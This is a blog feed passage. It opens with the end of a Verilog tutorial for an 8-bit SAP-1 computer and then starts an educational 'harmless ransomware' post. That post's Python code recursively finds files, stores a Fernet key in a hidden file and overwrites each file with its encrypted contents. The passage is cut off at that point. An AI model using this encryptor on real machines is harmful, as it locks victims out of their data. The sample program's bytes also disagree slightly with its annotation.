</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">adder</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">a</span>(<span style="color:#e06c75">a_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">b</span>(<span style="color:#e06c75">b_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">sub</span>(<span style="color:#e06c75">adder_sub</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">adder_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// instruction register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ir</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">ir_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">ir_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// controller
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">controller</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">opcode</span>(<span style="color:#e06c75">ir_out</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">4</span>]), <span style="color:#7f848e">// upper 4 bits
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        .<span style="color:#e06c75">out</span>(
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hlt</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_inc</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mar_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mem_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">b_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_sub</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_en</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-top-module-testbench">The top module testbench</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">top_design_tb</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">$dumpfile</span>(<span style="color:#98c379">&#34;top_design_tb.vcd&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">$dumpvars</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">top_design_tb</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// pulse reset signal
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">rst</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>        #<span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">rst</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// multiplexer
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">4</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus_en</span> <span style="color:#56b6c2">=</span> {<span style="color:#e06c75">pc_en</span>, <span style="color:#e06c75">mem_en</span>, <span style="color:#e06c75">ir_en</span>, <span style="color:#e06c75">a_en</span>, <span style="color:#e06c75">adder_en</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>) 
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> (<span style="color:#e06c75">bus_en</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00001</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00010</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00100</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b01000</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b10000</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">default</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// clock signal
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">reg</span> <span style="color:#e06c75">clk_in</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">integer</span> <span style="color:#e06c75">i</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">128</span>; <span style="color:#e06c75">i</span><span style="color:#56b6c2">++</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>            #<span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">clk_in</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">~</span><span style="color:#e06c75">clk_in</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">clk</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">hlt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">reg</span> <span style="color:#e06c75">rst</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">clock</span> <span style="color:#e06c75">clock</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">hlt</span>(<span style="color:#e06c75">hlt</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_in</span>(<span style="color:#e06c75">clk_in</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_out</span>(<span style="color:#e06c75">clk</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_inc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pc</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">inc</span>(<span style="color:#e06c75">pc_inc</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">pc_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mar_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mem_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">memory</span> <span style="color:#e06c75">mem</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">mar_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">mem_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_a</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">a_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">a_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">b_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_b</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">b_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">b_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_sub</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">adder</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">a</span>(<span style="color:#e06c75">a_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">b</span>(<span style="color:#e06c75">b_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">sub</span>(<span style="color:#e06c75">adder_sub</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">adder_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ir</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">ir_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">ir_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">controller</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">opcode</span>(<span style="color:#e06c75">ir_out</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">4</span>]),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hlt</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_inc</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mar_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mem_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">b_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_sub</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_en</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h1 id="the-program">The program</h1>
<p>Finally, to program the computer, we can program the bytes directly into a file named <code>program.bin</code>. This file will get loaded into the memory module when the computer starts. Here&rsquo;s an example program:</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">0D 2E 1F F0 00 00 00 00 00 00 00 00 00 05 04 02
</code></pre><p>This is the annotated version of the example program:</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">$0      0D      // LDA $D   Load A with the value at address $D
$1      1E      // ADD $E   Add the value at address $E to A
$2      2F      // SUB $F   Subtract the value at address $F from A
$3      F0      // HLT      Stop execution
$4      00      // Padding byte
$5      00      // Padding byte
$6      00      // Padding byte
$7      00      // Padding byte
$8      00      // Padding byte
$9      00      // Padding byte
$A      00      // Padding byte
$B      00      // Padding byte
$C      00      // Padding byte
$D      05      // Data
$E      04      // Data
$F      02      // Data
</code></pre><p>And after all of that, we have the end result, a functioning 8-bit computer:</p>
<p><img alt="8bit computer waveforms" src="/img/8bit-computer/8bit-computer-waveforms.png"></p>
<p>We can see that the data in <em>reg_a</em> is getting added and subtracted with the data in <em>reg_b</em> just like how we programmed it in <code>program.bin</code>.</p>
<blockquote>
<p>You can find the source code <a href="https://github.com/namberino/fpga-computer/tree/8bit">here</a>.</p>
</blockquote>
<h1 id="references">References</h1>
<ul>
<li><a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Ben Eater&rsquo;s 8-bit computer series</a></li>
<li><a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_title_bk">Digital Computer Electronics</a></li>
<li><a href="https://drive.google.com/file/d/17fH-JBU5OX_4AG123AO47y879YxzmDwX/view">SAP-1 Implementation Report</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>The world&#39;s most harmless ransomware</title>
            <link>https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/</link>
            <pubDate>Fri, 23 Feb 2024 17:37:37 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/</guid>
            <description>Disclaimer: Please do NOT use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. STAY SAFE AND DON&amp;rsquo;T GET IN TROUBLE!
Ever since I started watching Mr. Robot, I got really interested in hacking and hackers. I&amp;rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.</description>
            <content type="html"><![CDATA[<blockquote>
<p><strong>Disclaimer</strong>: Please do <strong>NOT</strong> use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. <strong>STAY SAFE AND DON&rsquo;T GET IN TROUBLE!</strong></p>
</blockquote>
<p>Ever since I started watching <em>Mr. Robot</em>, I got really interested in hacking and hackers. I&rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.</p>
<p>One type of exploit that caught my eyes is <em>ransomware</em>. The idea that a program can just encrypt your computer with all your files and make you pay to get them back is both terrifying and fascinating.</p>
<p>When I was learning about how ransomware attacks work, I decided to try making a simple (and rather harmless) ransomware myself to understand them better. So let&rsquo;s learn about ransomware by making one!</p>
<hr>
<h1 id="the-concept">The concept</h1>
<p>A ransomware will encrypt the files on the victim&rsquo;s machine and will decrypt the files once the attacker allows it to (usually after the victim has paid some money).</p>
<p>So we need a way to find all the files on a machine, encrypt them with a key, and then later on, decrypt those files with the same key we used to encrypt them.</p>
<hr>
<h1 id="the-environment">The environment</h1>
<p>For this project, we will use a cryptography library to be able to encrypt and decrypt the files. I opted for a library called <code>cryptography</code> and we can install this by using <code>pip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
</span></span></code></pre></div><hr>
<h1 id="the-encryption">The encryption</h1>
<p>So, how do we encrypt all the files on a machine? First of all, we need to find all the files on a machine. To do this, we can use the <code>os</code> library. We&rsquo;ll also use the cryptography library we just installed for encryption.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span></code></pre></div><p>We will find all the files and put them into a list called <code>files</code>.</p>
<p>We will need to check whether a &lsquo;file&rsquo; is a directory or a file, we can use <code>os.path.isfile()</code> to check it. If the &lsquo;file&rsquo; is not a file and is a directory, we can go into that directory recursively find all the files within that directory.</p>
<p>After we&rsquo;re finished with looking through a directory, we can go out of the directory and save the relative path to the file we found.</p>
<p>We also want to avoid our encryption and decryption files along with our key file that will later save our decryption key.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># bill-cipher.py</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span></code></pre></div><p>Now we need a key to encrypt the files with.</p>
<p>This key will be saved in a file named <code>.a_deal</code> because dotfiles will be hidden on Linux systems.</p>
<p>After we generated the key, we want to open all the files, read their contents, encrypt the contents, then write all of the encrypted contents back into the files.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
